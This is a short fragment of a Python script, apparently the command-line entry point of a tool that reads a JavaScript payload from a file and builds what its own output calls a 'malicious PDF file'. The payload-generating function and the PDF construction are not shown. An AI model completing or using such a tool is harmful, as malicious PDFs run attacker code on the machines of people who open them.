...
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <javascript payload file path> <outputname.pdf>")
        sys.exit(1)

    js_payload_path = sys.argv[1]
    output_file_name = sys.argv[2]
    with open(js_payload_path, "r") as f:
        js_code = f.read()

    print(f"[+] Created malicious PDF file: {output_file_name}")

    payload = generate_payload(js_code)
